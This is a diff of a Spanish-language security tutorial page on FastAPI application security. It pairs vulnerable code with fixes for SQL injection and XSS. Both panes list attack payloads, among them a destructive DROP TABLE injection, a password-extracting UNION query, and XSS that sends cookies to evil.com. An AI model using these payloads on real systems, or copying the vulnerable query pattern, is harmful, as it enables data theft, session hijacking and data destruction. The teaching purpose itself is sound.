-  .dep-row{display:grid;grid-template-columns:200px 80px 80px 1fr auto;align-items:center;gap:0;padding:0.8rem 1.2rem;border:1px solid rgba(255,255,255,0.04);transition:background 0.2s}
-  .dep-row.header-row-dep{border-color:rgba(255,107,26,0.1);background:rgba(255,107,26,0.02)}
-  .dep-row:not(.header-row-dep):hover{background:rgba(255,255,255,0.01)}
-  .dep-name{font-family:var(--mono);font-size:0.72rem;color:var(--white);letter-spacing:0.03em}
-  .dep-ver{font-family:var(--mono);font-size:0.68rem}
-  .dep-latest{font-family:var(--mono);font-size:0.68rem;color:var(--green)}
-  .dep-desc{font-size:0.85rem;color:rgba(234,231,224,0.4)}
-  .dep-badge{font-family:var(--mono);font-size:0.55rem;padding:0.15rem 0.5rem;letter-spacing:0.08em;text-transform:uppercase;white-space:nowrap}
-  .db-ok{background:rgba(6,214,160,0.06);border:1px solid rgba(6,214,160,0.15);color:var(--green)}
-  .db-vuln{background:rgba(239,35,60,0.08);border:1px solid rgba(239,35,60,0.2);color:var(--red)}
-  .db-upd{background:rgba(255,209,102,0.06);border:1px solid rgba(255,209,102,0.15);color:var(--yellow)}
-  .dep-hdr{font-family:var(--mono);font-size:0.58rem;color:var(--gray);letter-spacing:0.12em;text-transform:uppercase}
+/* PATTERNS */
+.pattern-cards{display:grid;grid-template-columns:repeat(3,1fr);gap:1.5rem;margin-top:4rem}
+.pattern-card{border:1px solid rgba(255,255,255,0.05);padding:2rem;position:relative;overflow:hidden;transition:border-color 0.3s}
+.pattern-card:hover{border-color:rgba(255,107,26,0.2)}
+.pattern-num{font-family:var(--display);font-size:3.5rem;color:rgba(255,107,26,0.06);position:absolute;top:0.5rem;right:1rem;line-height:1}
+.pattern-icon{font-size:1.5rem;margin-bottom:0.8rem}
+.pattern-name{font-family:var(--mono);font-size:0.72rem;color:var(--white);letter-spacing:0.1em;text-transform:uppercase;margin-bottom:0.6rem}
+.pattern-desc{font-size:0.9rem;color:rgba(234,231,224,0.45);line-height:1.65}
+.pattern-code{margin-top:1rem;font-family:var(--mono);font-size:0.65rem;color:var(--green);background:rgba(6,214,160,0.03);border:1px solid rgba(6,214,160,0.1);padding:0.6rem 0.8rem;line-height:1.7}
 
-  /* ── SECURE CODING PATTERNS ── */
-  .patterns-section{padding:8rem 3rem;background:linear-gradient(to bottom,transparent,rgba(255,107,26,0.01),transparent)}
-  .pattern-cards{display:grid;grid-template-columns:repeat(3,1fr);gap:1.5rem;margin-top:4rem}
-  .pattern-card{border:1px solid rgba(255,255,255,0.05);padding:2rem;position:relative;overflow:hidden;transition:border-color 0.3s}
-  .pattern-card:hover{border-color:rgba(255,107,26,0.2)}
-  .pattern-num{font-family:var(--display);font-size:3.5rem;color:rgba(255,107,26,0.06);position:absolute;top:0.5rem;right:1rem;line-height:1}
-  .pattern-icon{font-size:1.5rem;margin-bottom:0.8rem}
-  .pattern-name{font-family:var(--mono);font-size:0.72rem;color:var(--white);letter-spacing:0.1em;text-transform:uppercase;margin-bottom:0.6rem}
-  .pattern-desc{font-size:0.9rem;color:rgba(234,231,224,0.45);line-height:1.65}
-  .pattern-code{margin-top:1rem;font-family:var(--mono);font-size:0.65rem;color:var(--green);background:rgba(6,214,160,0.03);border:1px solid rgba(6,214,160,0.1);padding:0.6rem 0.8rem;line-height:1.7}
+/* CODE SECTION */
+.code-tabs{display:flex;flex-wrap:wrap;gap:0;margin-top:4rem;border-bottom:1px solid rgba(255,255,255,0.06)}
+.code-tab{font-family:var(--mono);font-size:0.62rem;letter-spacing:0.08em;text-transform:uppercase;padding:0.7rem 1.2rem;color:var(--gray);cursor:pointer;border-bottom:2px solid transparent;transition:all 0.2s;white-space:nowrap}
+.code-tab.active{color:var(--orange);border-bottom-color:var(--orange)}
+.code-tab:hover{color:var(--white)}
+.code-pane{display:none}
+.code-pane.active{display:block}
+.code-block{background:rgba(6,5,8,0.97);border:1px solid rgba(255,255,255,0.06);border-top:none;padding:2rem;font-family:var(--mono);font-size:0.76rem;line-height:1.95;overflow-x:auto;max-height:560px;overflow-y:auto}
+.code-block::-webkit-scrollbar{width:3px;height:3px}
+.code-block::-webkit-scrollbar-thumb{background:rgba(255,107,26,0.2);border-radius:2px}
+.code-block pre{margin:0;white-space:pre-wrap}
+/* syntax */
+.kw{color:#c792ea}.fn{color:var(--yellow)}.str{color:var(--green)}.cm{color:var(--gray);font-style:italic}
+.dec{color:var(--blue)}.cls{color:#82aaff}.num{color:var(--red)}.vl{color:var(--red)}.gd{color:var(--green)}
 
-  /* ── FULL SECURE CODE ── */
-  .code-section{padding:6rem 3rem}
-  .code-tabs{display:flex;flex-wrap:wrap;gap:0;margin-top:4rem;border-bottom:1px solid rgba(255,255,255,0.06)}
-  .code-tab{font-family:var(--mono);font-size:0.62rem;letter-spacing:0.08em;text-transform:uppercase;padding:0.7rem 1.2rem;color:var(--gray);cursor:pointer;border-bottom:2px solid transparent;transition:all 0.2s;white-space:nowrap}
-  .code-tab.active{color:var(--orange);border-bottom-color:var(--orange)}
-  .code-tab:hover{color:var(--white)}
-  .code-pane{display:none}
-  .code-pane.active{display:block}
-  .code-block{background:rgba(6,5,8,0.97);border:1px solid rgba(255,255,255,0.06);border-top:none;padding:2rem;font-family:var(--mono);font-size:0.77rem;line-height:1.95;overflow-x:auto;max-height:600px;overflow-y:auto}
-  .code-block::-webkit-scrollbar{width:3px;height:3px}
-  .code-block::-webkit-scrollbar-thumb{background:rgba(255,107,26,0.2);border-radius:2px}
+/* MATURITY */
+.maturity-levels{display:flex;flex-direction:column;gap:2px;margin-top:4rem}
+.mat-row{display:grid;grid-template-columns:120px 100px 1fr;align-items:center;gap:0;padding:1.2rem 1.5rem;border:1px solid rgba(255,255,255,0.04);transition:background 0.2s;position:relative;overflow:hidden}
+.mat-row::before{content:'';position:absolute;left:0;top:0;bottom:0;width:3px}
+.mat-row:hover{background:rgba(255,107,26,0.015)}
+.ml0::before{background:var(--red)}.ml1::before{background:var(--orange)}
+.ml2::before{background:var(--yellow)}.ml3::before{background:var(--green)}.ml4::before{background:var(--blue)}
+.mat-level{font-family:var(--display);font-size:1.5rem;letter-spacing:0.05em}
+.ml0 .mat-level{color:var(--red)}.ml1 .mat-level{color:var(--orange)}
+.ml2 .mat-level{color:var(--yellow)}.ml3 .mat-level{color:var(--green)}.ml4 .mat-level{color:var(--blue)}
+.mat-score{font-family:var(--mono);font-size:0.65rem;color:var(--gray);letter-spacing:0.1em}
+.mat-items{font-size:0.9rem;color:rgba(234,231,224,0.5);line-height:1.5}
+.mat-items strong{color:var(--white);font-weight:400}
 
-  /* ── APPSEC MATURITY ── */
-  .maturity-section{padding:8rem 3rem}
-  .maturity-levels{display:flex;flex-direction:column;gap:2px;margin-top:4rem}
-  .maturity-row{display:grid;grid-template-columns:120px 80px 1fr;align-items:center;gap:0;padding:1.2rem 1.5rem;border:1px solid rgba(255,255,255,0.04);cursor:pointer;transition:background 0.2s;position:relative;overflow:hidden}
-  .maturity-row::before{content:'';position:absolute;left:0;top:0;bottom:0;width:3px;transition:opacity 0.3s;opacity:0}
-  .maturity-row:hover::before{opacity:1}
-  .ml0::before{background:var(--red)}.ml1::before{background:var(--orange)}.ml2::before{background:var(--yellow)}.ml3::before{background:var(--green)}.ml4::before{background:var(--blue)}
-  .maturity-row:hover{background:rgba(255,107,26,0.02)}
-  .mat-level{font-family:var(--display);font-size:1.5rem;letter-spacing:0.05em}
-  .ml0 .mat-level{color:var(--red)}.ml1 .mat-level{color:var(--orange)}.ml2 .mat-level{color:var(--yellow)}.ml3 .mat-level{color:var(--green)}.ml4 .mat-level{color:var(--blue)}
-  .mat-score{font-family:var(--mono);font-size:0.65rem;color:var(--gray);letter-spacing:0.1em}
-  .mat-items{font-size:0.9rem;color:rgba(234,231,224,0.5);line-height:1.5}
-  .mat-items strong{color:var(--white);font-weight:400}
+/* LOG */
+.log-section{padding:5rem 3rem;border-top:1px solid rgba(255,255,255,0.04)}
+.log-entry{max-width:800px;margin:3rem auto 0;background:rgba(255,107,26,0.02);border:1px solid rgba(255,107,26,0.1);padding:3rem;position:relative}
+.log-entry::before{content:'ENTRADA DE APRENDIZAJE // CAPÍTULO 06';font-family:var(--mono);font-size:0.55rem;color:var(--orange);letter-spacing:0.25em;position:absolute;top:-0.5rem;left:2rem;background:var(--black);padding:0 0.8rem}
+.log-date{font-family:var(--mono);font-size:0.65rem;color:var(--gray);margin-bottom:1.5rem}
+.log-entry p{font-size:1.05rem;color:rgba(234,231,224,0.65);line-height:1.85;font-style:italic}
+.log-entry p+p{margin-top:1rem}
 
-  /* LOG */
-  .log-section{padding:5rem 3rem;border-top:1px solid rgba(255,255,255,0.04)}
-  .log-entry{max-width:800px;margin:3rem auto 0;background:rgba(255,107,26,0.02);border:1px solid rgba(255,107,26,0.1);padding:3rem;position:relative}
-  .log-entry::before{content:'ENTRADA DE APRENDIZAJE // CAPÍTULO 06';font-family:var(--mono);font-size:0.55rem;color:var(--orange);letter-spacing:0.25em;position:absolute;top:-0.5rem;left:2rem;background:var(--black);padding:0 0.8rem}
-  .log-date{font-family:var(--mono);font-size:0.65rem;color:var(--gray);margin-bottom:1.5rem}
-  .log-entry p{font-size:1.05rem;color:rgba(234,231,224,0.65);line-height:1.85;font-style:italic}
-  .log-entry p+p{margin-top:1rem}
+/* FOOTER */
+footer{padding:4rem 3rem;border-top:1px solid rgba(255,255,255,0.04);display:flex;justify-content:space-between;align-items:center}
+.footer-brand{font-family:var(--display);font-size:1.5rem;letter-spacing:0.3em;color:rgba(255,107,26,0.3)}
+.chapter-nav{display:flex;gap:3rem}
+.ch-link{display:flex;flex-direction:column;gap:0.3rem;text-decoration:none}
+.ch-label{font-family:var(--mono);font-size:0.6rem;color:var(--gray);letter-spacing:0.2em;text-transform:uppercase}
+.ch-title{font-family:var(--display);font-size:1.1rem;letter-spacing:0.1em;color:var(--white);transition:color 0.2s}
+.ch-link:hover .ch-title{color:var(--orange)}
+.ch-link.prev .ch-title{color:rgba(234,231,224,0.3)}
+.footer-copy{font-family:var(--mono);font-size:0.6rem;color:var(--gray);letter-spacing:0.1em;text-align:center;padding:1.5rem 3rem;border-top:1px solid rgba(255,255,255,0.03)}
 
-  /* FOOTER */
-  footer{padding:4rem 3rem;border-top:1px solid rgba(255,255,255,0.04);display:flex;justify-content:space-between;align-items:center}
-  .footer-brand{font-family:var(--display);font-size:1.5rem;letter-spacing:0.3em;color:rgba(255,107,26,0.3)}
-  .chapter-nav{display:flex;gap:3rem}
-  .ch-link{display:flex;flex-direction:column;gap:0.3rem;text-decoration:none}
-  .ch-label{font-family:var(--mono);font-size:0.6rem;color:var(--gray);letter-spacing:0.2em;text-transform:uppercase}
-  .ch-title{font-family:var(--display);font-size:1.1rem;letter-spacing:0.1em;color:var(--white);transition:color 0.2s}
-  .ch-link:hover .ch-title{color:var(--orange)}
-  .ch-link.prev .ch-title{color:rgba(234,231,224,0.3)}
-  .footer-copy{font-family:var(--mono);font-size:0.6rem;color:var(--gray);letter-spacing:0.1em;text-align:center;padding:1.5rem 3rem;border-top:1px solid rgba(255,255,255,0.03)}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.3}}
+@keyframes slideIn{from{opacity:0;transform:translateX(-8px)}to{opacity:1;transform:translateX(0)}}
 
-  @keyframes pulse{0%,100%{opacity:1}50%{opacity:0.3}}
-  @keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
-  @keyframes slideIn{from{opacity:0;transform:translateX(-8px)}to{opacity:1;transform:translateX(0)}}
-  @keyframes scanH{0%{top:0}100%{top:100%}}
-
-  @media(max-width:900px){
-    nav{padding:1rem 1.5rem}.nav-links{display:none}
-    .hero{grid-template-columns:1fr;min-height:auto}
-    .hero-right{display:none}
-    .hero-left{padding:6rem 1.5rem 4rem}
-    .section,.patterns-section,.code-section,.maturity-section{padding:5rem 1.5rem}
-    .threat-grid,.pattern-cards{grid-template-columns:1fr}
-    .vuln-pane.active,.playground-wrap,.headers-grid,.dep-row{grid-template-columns:1fr}
-    .dep-row{grid-template-columns:1fr 1fr}
-    footer{flex-direction:column;gap:2rem;align-items:flex-start}
-  }
+@media(max-width:900px){
+  nav{padding:1rem 1.5rem}.nav-links{display:none}
+  .hero{grid-template-columns:1fr}.hero-right{display:none}.hero-left{padding:6rem 1.5rem 4rem}
+  .section{padding:5rem 1.5rem}
+  .threat-grid,.pattern-cards{grid-template-columns:1fr}
+  .vuln-pane.active,.playground-wrap,.headers-grid{grid-template-columns:1fr}
+  .dep-row{grid-template-columns:1fr 1fr}.dep-desc{display:none}
+  .upload-step{grid-template-columns:1fr}.us-status{border-left:none;border-top:1px solid rgba(255,255,255,0.04)}
+  .mat-row{grid-template-columns:80px 1fr}.mat-score{display:none}
+  footer{flex-direction:column;gap:2rem;align-items:flex-start}
+}
 </style>
 </head>
 <body>
@@ -256,38 +246,39 @@
 <nav>
   <a href="#" class="nav-logo">CIPHER<span>DOC</span></a>
   <ul class="nav-links">
-    <li><a href="#vulnerabilidades">Vulnerabilidades</a></li>
+    <li><a href="#amenazas">Amenazas</a></li>
+    <li><a href="#vulnerabilidades">Vulns</a></li>
     <li><a href="#inputs">Inputs</a></li>
     <li><a href="#uploads">File Upload</a></li>
     <li><a href="#headers">Headers</a></li>
-    <li><a href="#dependencias">Dependencias</a></li>
+    <li><a href="#dependencias">Deps</a></li>
   </ul>
-  <a href="cybersec_chapter5.html" class="nav-prev">← Cap. 05</a>
+  <a href="cybersec_chapter5.html" class="nav-prev">&#8592; Cap. 05</a>
 </nav>
 
-<!-- ════ HERO ════ -->
+<!-- HERO -->
 <section class="hero">
   <div class="hero-left">
-    <p class="chapter-tag">Capítulo 06 — Seguridad de aplicaciones</p>
+    <p class="chapter-tag">Cap&#237;tulo 06 &#8212; Seguridad de Aplicaciones</p>
     <h1>
       <span class="o">APP</span><br>
       <span class="y">SEC</span><br>
-      <span style="font-size:0.38em;letter-spacing:0.08em;color:rgba(234,231,224,0.2)">PROFUNDO</span>
+      <span style="font-size:0.38em;letter-spacing:0.08em;color:rgba(234,231,224,0.18)">PROFUNDO</span>
     </h1>
     <p class="hero-sub">
-      El código que escribes hoy decide si mañana alguien entra sin permiso. AppSec no es una fase final — es una práctica continua que empieza en la primera línea.
+      El c&#243;digo que escribes hoy decide si ma&#241;ana alguien entra sin permiso.
+      AppSec no es una fase final &#8212; es una pr&#225;ctica continua que empieza en la primera l&#237;nea.
     </p>
     <div class="hero-tags">
       <span class="htag">SQL Injection</span>
       <span class="htag">XSS</span>
-      <span class="htag">CSRF</span>
+      <span class="htag">IDOR</span>
       <span class="htag">SSRF</span>
       <span class="htag">File Upload</span>
-      <span class="htag">Input Validation</span>
+      <span class="htag">Mass Assignment</span>
       <span class="htag">Security Headers</span>
       <span class="htag">Dependency Audit</span>
       <span class="htag">Path Traversal</span>
-      <span class="htag">Mass Assignment</span>
     </div>
   </div>
   <div class="hero-right">
@@ -296,98 +287,94 @@
   </div>
 </section>
 
-<!-- ════ THREAT MODEL ════ -->
+<!-- THREAT OVERVIEW -->
 <section class="section" id="amenazas">
   <div class="section-inner">
-    <p class="sec-label fade-in">// sección 01 — panorama de amenazas</p>
-    <h2 class="sec-h2 fade-in">Las <em>10 amenazas</em><br>en tu FastAPI hoy</h2>
-    <p class="sec-sub fade-in">Antes de escribir código seguro, necesitas saber exactamente contra qué estás defendiendo. Cada una de estas existe en proyectos reales.</p>
-
+    <p class="sec-label fade-in">// secci&#243;n 01 &#8212; panorama</p>
+    <h2 class="sec-h2 fade-in">Las <em>8 amenazas</em><br>en tu FastAPI hoy</h2>
+    <p class="sec-sub fade-in">Antes de escribir c&#243;digo seguro, necesitas saber exactamente contra qu&#233; est&#225;s defendiendo.</p>
     <div class="threat-grid fade-in">
       <div class="threat-card">
-        <span class="threat-pill pill-c">CRÍTICO</span>
-        <div class="threat-sev sev-crit">A03</div>
+        <span class="threat-pill pill-c">CR&#205;TICO</span>
+        <div class="threat-sev sev-c">A03</div>
         <div class="threat-name">SQL Injection</div>
-        <div class="threat-desc">Input del usuario interpretado como SQL. Puede borrar toda tu base de datos en una request.</div>
+        <div class="threat-desc">Input del usuario interpretado como SQL. Puede borrar toda tu base de datos en una sola request.</div>
       </div>
       <div class="threat-card">
-        <span class="threat-pill pill-c">CRÍTICO</span>
-        <div class="threat-sev sev-crit">A01</div>
+        <span class="threat-pill pill-c">CR&#205;TICO</span>
+        <div class="threat-sev sev-c">A01</div>
         <div class="threat-name">Broken Access Control</div>
-        <div class="threat-desc">IDOR, escalada de privilegios, acceso a rutas admin sin autenticación real.</div>
+        <div class="threat-desc">IDOR, escalada de privilegios, acceso a rutas admin sin autenticaci&#243;n real.</div>
       </div>
       <div class="threat-card">
         <span class="threat-pill pill-h">ALTO</span>
-        <div class="threat-sev sev-high">A07</div>
-        <div class="threat-name">XSS / Injection</div>
-        <div class="threat-desc">Scripts maliciosos inyectados en respuestas. Tu API puede ser vector para atacar a tus usuarios.</div>
+        <div class="threat-sev sev-h">XSS</div>
+        <div class="threat-name">Cross-Site Scripting</div>
+        <div class="threat-desc">Scripts maliciosos inyectados en respuestas. Roba tokens de tus usuarios desde su navegador.</div>
       </div>
       <div class="threat-card">
         <span class="threat-pill pill-h">ALTO</span>
-        <div class="threat-sev sev-high">A04</div>
+        <div class="threat-sev sev-h">A04</div>
         <div class="threat-name">Mass Assignment</div>
-        <div class="threat-desc">El usuario envía campos extra (is_admin: true) que tu ORM acepta sin validar. Pydantic lo previene si se usa bien.</div>
+        <div class="threat-desc">El usuario env&#237;a is_admin:true en el body. Tu ORM lo acepta si no usas schemas estrictos.</div>
       </div>
       <div class="threat-card">
         <span class="threat-pill pill-h">ALTO</span>
-        <div class="threat-sev sev-high">A09</div>
+        <div class="threat-sev sev-h">A09</div>
         <div class="threat-name">File Upload Abuse</div>
-        <div class="threat-desc">Subir ejecutables disfrazados de imágenes. Path traversal para sobreescribir archivos del sistema.</div>
+        <div class="threat-desc">Ejecutables disfrazados de im&#225;genes. Path traversal para sobreescribir archivos del sistema.</div>
       </div>
       <div class="threat-card">
         <span class="threat-pill pill-h">ALTO</span>
-        <div class="threat-sev sev-high">A10</div>
-        <div class="threat-name">SSRF</div>
-        <div class="threat-desc">Tu servidor hace requests a URLs controladas por el atacante — puede acceder a metadata de cloud, servicios internos.</div>
+        <div class="threat-sev sev-h">SSRF</div>
+        <div class="threat-name">Server-Side Request Forgery</div>
+        <div class="threat-desc">Tu servidor hace requests a URLs del atacante &#8212; incluyendo metadata de AWS con credenciales IAM.</div>
       </div>
       <div class="threat-card">
         <span class="threat-pill pill-m">MEDIO</span>
-        <div class="threat-sev sev-med">A05</div>
+        <div class="threat-sev sev-m">A05</div>
         <div class="threat-name">Security Misconfig</div>
-        <div class="threat-desc">Debug activado, /docs expuesto, CORS abierto, headers de seguridad ausentes.</div>
+        <div class="threat-desc">/docs expuesto en producci&#243;n, CORS abierto, headers de seguridad ausentes, debug activado.</div>
       </div>
       <div class="threat-card">
         <span class="threat-pill pill-m">MEDIO</span>
-        <div class="threat-sev sev-med">A06</div>
+        <div class="threat-sev sev-m">A06</div>
         <div class="threat-name">Componentes Vulnerables</div>
-        <div class="threat-desc">Dependencias con CVEs conocidos. Una librería desactualizada puede comprometer todo el stack.</div>
+        <div class="threat-desc">Una librer&#237;a con CVE conocido puede comprometer todo el stack. Pillow, python-jose son ejemplos reales.</div>
       </div>
     </div>
   </div>
 </section>
 
-<!-- ════ LIVE SCANNER ════ -->
+<!-- LIVE SCANNER -->
 <section class="section" style="padding-top:2rem">
   <div class="section-inner">
-    <p class="sec-label fade-in">// herramienta — escáner simulado</p>
-    <h2 class="sec-h2 fade-in">Escáner de<br><em>superficie de ataque</em></h2>
-    <p class="sec-sub fade-in">Simula lo que un escáner automatizado encuentra en tu endpoint. Observa qué información revela cada respuesta.</p>
-
+    <p class="sec-label fade-in">// herramienta &#8212; esc&#225;ner simulado</p>
+    <h2 class="sec-h2 fade-in">Esc&#225;ner de superficie<br>de <em>ataque</em></h2>
+    <p class="sec-sub fade-in">Simula lo que un esc&#225;ner automatizado encuentra. Elige el modo y observa qu&#233; revela cada respuesta.</p>
     <div class="scanner-wrap fade-in">
       <div class="scanner-head">
-        <span class="scanner-title">⚡ AppSec Quick Scanner — Simulación educativa</span>
+        <span class="scanner-title">&#9889; AppSec Quick Scanner &#8212; Simulaci&#243;n educativa</span>
         <span class="scanner-status" id="scan-status-text">Listo</span>
       </div>
       <div class="scanner-body">
-        <div class="scan-input-col">
-          <label>Target URL</label>
+        <div>
+          <label class="scan-label">Target URL</label>
           <input class="scan-url" id="scan-url" value="http://localhost:8000/api/v1/users">
-          <div style="margin-top:0.8rem">
-            <label>Modo de escaneo</label>
-            <select id="scan-mode" style="width:100%;background:rgba(255,107,26,0.04);border:1px solid rgba(255,107,26,0.2);color:var(--white);font-family:var(--mono);font-size:0.78rem;padding:0.6rem 0.8rem;outline:none">
-              <option value="passive">Pasivo (reconocimiento)</option>
-              <option value="auth">Autenticación & Auth</option>
-              <option value="injection">Injection Testing</option>
-              <option value="headers">Headers & Config</option>
-            </select>
-          </div>
-          <button class="scan-btn" onclick="runScan()">▶ EJECUTAR ESCANEO</button>
-          <div style="font-family:var(--mono);font-size:0.6rem;color:var(--gray);margin-top:0.8rem;line-height:1.6">Solo simulación educativa.<br>Los hallazgos son calculados localmente.</div>
+          <label class="scan-label" style="margin-top:0.8rem">Modo de escaneo</label>
+          <select id="scan-mode" class="scan-select">
+            <option value="passive">Pasivo (reconocimiento)</option>
+            <option value="auth">Autenticaci&#243;n &amp; Auth</option>
+            <option value="injection">Injection Testing</option>
+            <option value="headers">Headers &amp; Config</option>
+          </select>
+          <button class="scan-btn" onclick="runScan()">&#9654; EJECUTAR ESCANEO</button>
+          <div style="font-family:var(--mono);font-size:0.6rem;color:var(--gray);margin-top:0.8rem;line-height:1.6">Solo simulaci&#243;n educativa. Los hallazgos son calculados localmente.</div>
         </div>
         <div>
-          <label style="font-family:var(--mono);font-size:0.58rem;color:var(--gray);letter-spacing:0.15em;text-transform:uppercase;display:block;margin-bottom:0.6rem">Hallazgos</label>
+          <label class="scan-label">Hallazgos</label>
           <div class="scan-results" id="scan-results">
-            <div class="scan-finding" style="color:var(--gray);font-family:var(--mono);font-size:0.68rem">Ejecuta el escáner para ver resultados...</div>
+            <div style="color:var(--gray);font-family:var(--mono);font-size:0.68rem;padding:0.5rem">Ejecuta el esc&#225;ner para ver resultados...</div>
           </div>
         </div>
       </div>
@@ -395,12 +382,12 @@
   </div>
 </section>
 
-<!-- ════ VULNERABILIDADES PROFUNDO ════ -->
+<!-- VULN DEEP DIVES -->
 <section class="section" id="vulnerabilidades" style="padding-top:2rem">
   <div class="section-inner">
-    <p class="sec-label fade-in">// sección 02 — inmersión profunda</p>
+    <p class="sec-label fade-in">// secci&#243;n 02 &#8212; inmersi&#243;n profunda</p>
     <h2 class="sec-h2 fade-in">Cada vulnerabilidad<br><em>en detalle</em></h2>
-    <p class="sec-sub fade-in">Código vulnerable real → explicación del ataque → corrección concreta. El patrón que repites hasta que se vuelve instinto.</p>
+    <p class="sec-sub fade-in">C&#243;digo vulnerable real &#8594; explicaci&#243;n del ataque &#8594; correcci&#243;n concreta.</p>
 
     <div class="vuln-nav fade-in">
       <div class="vuln-tab active" data-vtab="sqli">SQL Injection</div>
@@ -415,46 +402,41 @@
     <div class="vuln-pane active" id="vtab-sqli">
       <div class="vuln-theory">
         <h3>SQL Injection</h3>
-        <p>El input del usuario se concatena directamente en una query SQL. El atacante cierra la string e inyecta SQL propio. Con SQLAlchemy ORM estás protegido por defecto — el peligro está en <code style="color:var(--orange)">text()</code> con f-strings.</p>
-        <div class="attack-payload">
-          <span class="payload-label">Payload del atacante en ?q=</span>
-          ' OR '1'='1<br>
-          '; DROP TABLE users; --<br>
-          ' UNION SELECT email,password,3 FROM users--<br>
-          admin'--
-        </div>
-        <p>La segunda línea borra toda la tabla users. La tercera extrae emails y passwords. Con SQLMap esto se automatiza en segundos si el endpoint es vulnerable.</p>
-        <div style="margin-top:1rem;padding:0.8rem 1rem;background:rgba(6,214,160,0.04);border:1px solid rgba(6,214,160,0.1);font-family:var(--mono);font-size:0.68rem;color:var(--green);line-height:1.7">
-          ✓ Defensa: ORM parameterizado siempre. Si necesitas text(), usa bindparams. Pydantic valida tipos antes de que lleguen a la query.
-        </div>
+        <p>El input del usuario se concatena directamente en una query SQL. El atacante cierra el string e inyecta SQL propio. Con SQLAlchemy ORM est&#225;s protegido por defecto. El peligro est&#225; en <code style="color:var(--orange)">text()</code> con f-strings.</p>
+        <div class="attack-payload"><span class="payload-label">Payloads del atacante en ?q=</span>' OR '1'='1
+'; DROP TABLE users; --
+' UNION SELECT email,password,3 FROM users--
+admin'--</div>
+        <p>La segunda l&#237;nea borra toda la tabla. La tercera extrae emails y passwords. SQLMap automatiza esto en segundos.</p>
+        <div class="defense-note">&#10003; Defensa: ORM parametrizado siempre. Si necesitas text(), usa bindparams. Pydantic valida tipos antes de la query. Nunca mostrar errores de DB al cliente.</div>
       </div>
       <div class="vuln-code-col">
-        <div class="code-block-sm cb-bad">
-          <span class="cb-label lbl-bad">❌ VULNERABLE — SQL Injection</span>
-<span class="cm"># NUNCA hacer esto</span>
+        <div class="cblock cb-bad">
+          <span class="cb-label lbl-bad">&#10007; VULNERABLE &#8212; SQL Injection</span>
+          <pre><span class="cm"># NUNCA hacer esto</span>
 <span class="dec">@router.get</span>(<span class="str">"/search"</span>)
-<span class="kw">async def</span> <span class="fn">search_users</span>(q: <span class="cls">str</span>, db=<span class="fn">Depends</span>(get_db)):
-    <span class="vl">raw = f"SELECT * FROM users WHERE name='{q}'"</span>
-    <span class="vl">result = await db.execute(text(raw))</span>
+<span class="kw">async def</span> <span class="fn">search</span>(q: <span class="cls">str</span>, db=<span class="fn">Depends</span>(get_db)):
+<span class="vl">    raw = f"SELECT * FROM users WHERE name='{q}'"
+    result = await db.execute(text(raw))</span>
     <span class="kw">return</span> result.<span class="fn">fetchall</span>()
 
-<span class="cm"># Input: q = "' OR '1'='1"</span>
-<span class="cm"># Query real: SELECT * FROM users WHERE name='' OR '1'='1'</span>
-<span class="cm"># → devuelve TODOS los usuarios sin autenticación</span>
+<span class="cm"># q = "' OR '1'='1" → devuelve TODO</span></pre>
         </div>
-        <div class="code-block-sm cb-good">
-          <span class="cb-label lbl-good">✓ SEGURO — ORM parameterizado</span>
-<span class="cm"># SQLAlchemy ORM — siempre seguro</span>
-<span class="dec">@router.get</span>(<span class="str">"/search"</span>)
-<span class="kw">async def</span> <span class="fn">search_users</span>(
-    q: <span class="cls">str</span> = <span class="fn">Query</span>(max_length=<span class="num">100</span>, pattern=<span class="str">r"^[a-zA-Z0-9 _-]+$"</span>),
+        <div class="cblock cb-good">
+          <span class="cb-label lbl-good">&#10003; SEGURO &#8212; ORM parametrizado</span>
+          <pre><span class="dec">@router.get</span>(<span class="str">"/search"</span>)
+<span class="kw">async def</span> <span class="fn">search</span>(
+    q: <span class="cls">str</span> = <span class="fn">Query</span>(max_length=<span class="num">100</span>,
+               pattern=<span class="str">r"^[a-zA-Z0-9 _-]+$"</span>),
     db=<span class="fn">Depends</span>(get_db),
-    _=<span class="fn">Depends</span>(get_current_user),  <span class="cm"># auth requerida</span>
+    _=<span class="fn">Depends</span>(get_current_user),
 ):
     result = <span class="kw">await</span> db.<span class="fn">execute</span>(
-        <span class="fn">select</span>(User).<span class="fn">where</span>(User.name.<span class="fn">ilike</span>(<span class="fn">f</span><span class="str">"%{q}%"</span>))
-    )  <span class="cm"># SQLAlchemy escapa automáticamente</span>
-    <span class="kw">return</span> result.<span class="fn">scalars</span>().<span class="fn">all</span>()
+        <span class="fn">select</span>(User).<span class="fn">where</span>(
+            User.name.<span class="fn">ilike</span>(<span class="fn">f</span><span class="str">"%{q}%"</span>)
+        )
+    ) <span class="cm"># SQLAlchemy escapa autom&#225;ticamente</span>
+    <span class="kw">return</span> result.<span class="fn">scalars</span>().<span class="fn">all</span>()</pre>
         </div>
       </div>
     </div>
@@ -463,36 +445,30 @@
     <div class="vuln-pane" id="vtab-xss">
       <div class="vuln-theory">
         <h3>Cross-Site Scripting</h3>
-        <p>Tu API almacena o refleja HTML/JavaScript del usuario sin escapar. Cuando otro usuario ve ese contenido, el script malicioso corre en su navegador con acceso a sus cookies, tokens y cámara.</p>
-        <div class="attack-payload">
-          <span class="payload-label">Payloads XSS clásicos</span>
-          &lt;script&gt;fetch('https://evil.com?c='+document.cookie)&lt;/script&gt;<br>
-          &lt;img src=x onerror="document.location='//attacker.com?t='+localStorage.getItem('token')"&gt;<br>
-          &lt;svg/onload=alert(document.domain)&gt;<br>
-          javascript:eval(atob('...base64 malicioso...'))
-        </div>
-        <p>El robo de tokens vía XSS es la forma más común de account takeover. Con el access_token del usuario, el atacante se autentica como esa persona indefinidamente.</p>
-        <div style="margin-top:1rem;padding:0.8rem 1rem;background:rgba(6,214,160,0.04);border:1px solid rgba(6,214,160,0.1);font-family:var(--mono);font-size:0.68rem;color:var(--green);line-height:1.7">
-          ✓ Defensa: API JSON nunca renderiza HTML. Content-Security-Policy header. X-Content-Type-Options: nosniff. Sanitizar con bleach si aceptas HTML.
-        </div>
+        <p>Tu API almacena o refleja HTML/JavaScript del usuario sin escapar. Cuando otro usuario ve ese contenido, el script malicioso corre en su navegador con acceso a sus cookies y tokens.</p>
+        <div class="attack-payload"><span class="payload-label">Payloads XSS cl&#225;sicos</span>&lt;script&gt;fetch('https://evil.com?c='+document.cookie)&lt;/script&gt;
+&lt;img src=x onerror="document.location='//attacker.com'"&gt;
+&lt;svg/onload=alert(document.domain)&gt;
+javascript:eval(atob('BASE64_MALICIOSO'))</div>
